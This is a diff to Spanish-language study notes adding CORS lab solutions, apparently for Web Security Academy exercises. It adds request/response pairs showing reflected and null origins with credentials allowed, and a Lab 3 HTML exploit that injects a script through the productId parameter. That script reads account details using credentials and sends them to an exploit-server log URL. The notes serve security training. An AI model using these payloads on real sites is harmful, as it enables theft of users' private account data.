@@ -106,6 +106,17 @@ Estas cabeceras son fundamentales para la implementación de políticas de segur
 # Solucion a labs: 
 -- -
 ## Lab 1:
+
+```http
+Request:
+Origin: https://gustavo.com
+
+Response:
+Access-Control-Allow-Origin: https://gustavo.com
+Access-Control-Allow-Credentials: true
+
+```
+
 ```html
 <html>
 <body>
@@ -129,6 +140,17 @@ xhr.send(null);
 ```
 
 ## Lab 2:
+
+
+```http
+Request: 
+Origin: null
+
+Response:
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
 ```html
 <!DOCTYPE html>
 <html>
@@ -148,6 +170,28 @@ xhr.send(null);
             xhr.withCredentials = true;
             xhr.send(null)
         </script>"></iframe>
+    </body>
+</html>
+
+```
+## Lab 3:
+```http
+Request: 
+Origin: https://gustavo.0ac500df0432c047807b53a900c600b4.web-security-academy.net
+
+Response:
+Access-Control-Allow-Origin: https://gustavo.0ac500df0432c047807b53a900c600b4.web-security-academy.net
+Access-Control-Allow-Credentials: true
+```
+
+```html
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            // Redirecciona al usuario a una URL que inyecta un script malicioso en el parámetro productId
+            document.location = "http://stock.0ae100a2049e0fb4817d20f300b800b1.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest(); var url = 'https://0ae100a2049e0fb4817d20f300b800b1.web-security-academy.net'; xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { fetch('https://exploit-0a44000f04a30fd581bd1f2101e00026.exploit-server.net/log?key=' + xhr.responseText) } }; xhr.open('GET', url + '/accountDetails', true); xhr.withCredentials = true; xhr.send(null);<%2c/script>&storeId=1"
+        </script>
     </body>
 </html>
 
